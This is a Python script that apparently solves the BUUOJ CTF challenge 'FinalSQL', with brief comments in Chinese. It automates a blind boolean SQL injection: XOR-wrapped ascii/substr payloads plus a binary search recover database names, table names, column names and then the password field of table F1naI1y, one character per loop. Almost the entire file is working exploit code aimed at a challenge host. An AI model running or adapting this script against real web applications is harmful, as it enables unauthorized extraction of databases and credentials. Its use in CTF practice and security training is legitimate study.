import re
import requests
import time

'''
题目：https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]FinalSQL
'''

url = "http://ce38209b-a516-454c-918d-265631d396f4.node4.buuoj.cn:81/search.php"
temp = {"id" : ""}
column = ""
for i in range(1,1000):
    time.sleep(0.06)
    low = 32
    high =128
    mid = (low+high)//2
    while(low<high):
        #库名
        # temp["id"] = "1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))>%d)^1" %(i,mid)
        #表名
        #temp["id"] = "1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))>%d)^1" %(i,mid)
        #字段名
        #temp["id"] = "1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))>%d)^1" %(i,mid)
        #内容
        temp["id"] = "1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))>%d)^1" %(i,mid)
        r = requests.get(url,params=temp)
        time.sleep(0.04)
        print(low,high,mid,":")
        if "Click" in r.text:
            low = mid+1
        else:
            high = mid
        mid =(low+high)//2
    if(mid ==32 or mid ==127):
        break
    column +=chr(mid)
    print(column)
   
print("All:" ,column)